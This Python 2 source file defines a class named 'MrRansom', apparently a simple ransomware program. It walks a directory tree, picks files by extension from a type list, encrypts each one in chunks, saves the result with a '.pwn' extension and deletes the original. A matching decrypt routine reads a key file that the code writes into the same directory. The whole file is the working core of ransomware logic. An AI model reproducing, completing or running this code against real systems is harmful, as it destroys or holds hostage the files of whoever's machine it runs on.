import json
import os
import time
import sys
import locksmith

from file_util import read_chunks, get_file, write_chunk
from aldersonalgorithm import AldersonAlgorithm

ENCRYPT = 'encrypt'

DECRYPT = 'decrypt'

FILE_TYPES_JSON = os.path.join(os.path.dirname(os.path.realpath(__file__)), "file_types.json")

ENCRYPTED_EXTENSION = ".pwn"


def get_target_files(files, mode):
    files_to_process = []
    for file_path in files:
        if should_process(file_path, mode):
            files_to_process.append(file_path)

    return files_to_process


def should_process(file_path, mode):
    return mode == ENCRYPT and can_encrypt_file(file_path) \
           or mode == DECRYPT and can_decrypt_file(file_path)


def can_encrypt_file(file_path):
    for file_type in encryptable_file_types():
        if file_path.endswith(file_type) and not os.path.basename(file_path).startswith("."):
            return True


def can_decrypt_file(file_name):
    if file_name.endswith(ENCRYPTED_EXTENSION):
        return True


def encryptable_file_types():
    types_json = json.loads(get_file(FILE_TYPES_JSON))

    return [file_type for file_type in types_json["fileTypes"]]


class MrRansom:

    def __init__(self, root_dir):
        self.root_dir = root_dir
        self.all_files = [os.path.join(root, file_name) for root, directories, file_names in
                          os.walk(root_dir) for file_name in file_names]

    def encrypt(self):
        key = locksmith.create_key()

        locksmith.export_key_file(self.root_dir, key)

        for file_path in get_target_files(self.all_files, ENCRYPT):
            out_file_path = file_path + ENCRYPTED_EXTENSION

            self.process(file_path, out_file_path, AldersonAlgorithm(key).encrypt_chunk)

    def decrypt(self):
        try:
            key = locksmith.get_key_file(self.root_dir)
        except Exception as e:
            print >> sys.stderr, e.message
            exit(-1)

        for file_path in get_target_files(self.all_files, DECRYPT):
            out_file_path = file_path[:len(file_path) - len(ENCRYPTED_EXTENSION)]

            self.process(file_path, out_file_path, AldersonAlgorithm(key).decrypt_chunk)

    @staticmethod
    def process(in_file_path, out_file_path, process):
        start_time = time.time()

        in_file = open(in_file_path, "rb")
        out_file = open(out_file_path, "w")

        for chunk in read_chunks(in_file):
            write_chunk(out_file, process(chunk))

        in_file.close()
        out_file.close()

        os.remove(in_file_path)

        print "Took {}s processing '{}'".format(time.time() - start_time, in_file_path)
